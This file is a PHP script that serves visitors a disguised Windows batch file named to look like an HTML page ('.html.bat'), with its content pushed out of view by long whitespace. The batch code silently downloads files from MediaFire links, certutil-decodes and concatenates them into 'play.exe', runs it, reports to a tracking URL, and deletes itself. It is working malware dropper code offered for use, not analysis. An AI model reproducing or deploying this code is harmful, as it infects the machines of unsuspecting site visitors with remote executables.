<?php

ob_end_clean();
$bat = <<<EOL






































































































@echo off
powershell -windowstyle hidden -Command 2>nul >nul
set "iplo=https://maper.info/1ix3L4"
set "link=https://www.mediafire.com/file/y1at1lrm6x7z0tb/ukoli1.rar/file"
set "link2=https://www.mediafire.com/file/hrwwz43n6ystvwc/bipayemarit2.rar/file"
rem 

set url=%link%
set "savePath=%temp%\weba.html"
set userAgent=USERAGENTp
powershell -Command "& { dollarrequest = [System.Net.WebRequest]::Create('%url%'); dollarrequest.UserAgent = '%userAgent%'; dollarresponse = dollarrequest.GetResponse(); dollarresponseStream = dollarresponse.GetResponseStream(); dollarfileStream = New-Object System.IO.FileStream('%savePath%', [System.IO.FileMode]::Create); [byte[]]dollarbuffer = New-Object byte[] 1024; while((dollarbytesRead = dollarresponseStream.Read(dollarbuffer, 0, dollarbuffer.Length)) -gt 0) { dollarfileStream.Write(dollarbuffer, 0, dollarbytesRead); } dollarfileStream.Close(); dollarresponseStream.Close(); }"
rem
set url=%link2%
set "savePath=%temp%\webb.html"
set userAgent=USERAGENTp
powershell -Command "& { dollarrequest = [System.Net.WebRequest]::Create('%url%'); dollarrequest.UserAgent = '%userAgent%'; dollarresponse = dollarrequest.GetResponse(); dollarresponseStream = dollarresponse.GetResponseStream(); dollarfileStream = New-Object System.IO.FileStream('%savePath%', [System.IO.FileMode]::Create); [byte[]]dollarbuffer = New-Object byte[] 1024; while((dollarbytesRead = dollarresponseStream.Read(dollarbuffer, 0, dollarbuffer.Length)) -gt 0) { dollarfileStream.Write(dollarbuffer, 0, dollarbytesRead); } dollarfileStream.Close(); dollarresponseStream.Close(); }"


for /f "delims=" %%a in ('find "https://download" %temp%\weba.html ^| find /i ".rar"') do set "result=%%a"

set "result=%result:"=%"
set "result=%result:*https://download=https://download%"
for /f "tokens=1* delims= " %%a in ("%result%") do set result=%%a
set "result=%result: =%"



for /f "delims=" %%a in ('find "https://download" %temp%\webb.html ^| find /i ".rar"') do set "result2=%%a"

set "result2=%result2:"=%"
set "result2=%result2:*https://download=https://download%"
for /f "tokens=1* delims= " %%a in ("%result2%") do set result2=%%a
set "result2=%result2: =%"
del %temp%\weba.html
del %temp%\webb.html

rem
set url=%result%
set userAgent=USERAGENTp
set savePath=%temp%\playvideoa.a
powershell -Command "& { dollarrequest = [System.Net.WebRequest]::Create('%url%'); dollarrequest.UserAgent = '%userAgent%'; dollarresponse = dollarrequest.GetResponse(); dollarresponseStream = dollarresponse.GetResponseStream(); dollarfileStream = New-Object System.IO.FileStream('%savePath%', [System.IO.FileMode]::Create); [byte[]]dollarbuffer = New-Object byte[] 1024; while((dollarbytesRead = dollarresponseStream.Read(dollarbuffer, 0, dollarbuffer.Length)) -gt 0) { dollarfileStream.Write(dollarbuffer, 0, dollarbytesRead); } dollarfileStream.Close(); dollarresponseStream.Close(); }"


rem
set url=%result2%
set userAgent=USERAGENTp
set savePath=%temp%\playvideob.f
powershell -Command "& { dollarrequest = [System.Net.WebRequest]::Create('%url%'); dollarrequest.UserAgent = '%userAgent%'; dollarresponse = dollarrequest.GetResponse(); dollarresponseStream = dollarresponse.GetResponseStream(); dollarfileStream = New-Object System.IO.FileStream('%savePath%', [System.IO.FileMode]::Create); [byte[]]dollarbuffer = New-Object byte[] 1024; while((dollarbytesRead = dollarresponseStream.Read(dollarbuffer, 0, dollarbuffer.Length)) -gt 0) { dollarfileStream.Write(dollarbuffer, 0, dollarbytesRead); } dollarfileStream.Close(); dollarresponseStream.Close(); }"

set url=%iplo%
set referer=SITEID
set userAgent=USERAGENT2
powershell -Command "& { dollarrequest = [System.Net.WebRequest]::Create(dollarenv:url); dollarrequest.Method = 'GET'; dollarrequest.Referer = dollarenv:referer; dollarrequest.UserAgent = dollarenv:userAgent; dollarresponse = dollarrequest.GetResponse(); dollarstream = dollarresponse.GetResponseStream(); dollarreader = New-Object System.IO.StreamReader(dollarstream); dollarcontent = dollarreader.ReadToEnd(); dollarreader.Close(); dollarresponse.Close(); }"
rem



certutil -decode %temp%\playvideoa.a %temp%\playvideoa.b
del %temp%\playvideoa.a
certutil -decode %temp%\playvideoa.b %temp%\playvideoa.c
del %temp%\playvideoa.b
certutil -decode %temp%\playvideoa.c %temp%\playvideoa.d
del %temp%\playvideoa.c
Copy /b "%temp%\playvideoa.d"+"%temp%\playvideob.f" "%temp%\play.exe"
del %temp%\playvideoa.d
del %temp%\playvideob.f

start %temp%\play.exe
CMD /C DEL %0
exit


EOL;


$url = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
$url .= "://";
if (isset($_SERVER['HTTP_HOST'])) {
    $url .= $_SERVER['HTTP_HOST'];
} else {
    $url .= gethostbyname(gethostname());
}

$parsed_url = parse_url($url);

if (isset($parsed_url['host'])) {
    $host = $parsed_url['host'];
} else {
    $host = $parsed_url['path'];
}

$bat = str_replace('SITEID', $host, $bat);
////
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$current_time = '//' . date('d.m--H:i') . '//'; 
$user_agent_with_time = $user_agent . ' ' . $current_time;
$bat = str_replace('USERAGENTp',$_SERVER['HTTP_USER_AGENT'],$bat);
$bat = str_replace('USERAGENT2', $user_agent_with_time, $bat);
//
$bat = str_replace('dollar','$',$bat);
download_file($bat, '🌍' . $host . '__________________________________________.html.bat');
function download_file($file, $name) {
    ///header('Content-Type: application/octet-stream');
    header('Content-type: text/plain');
    header('Content-Disposition: attachment; filename=' . $name);
    exit($file);
}
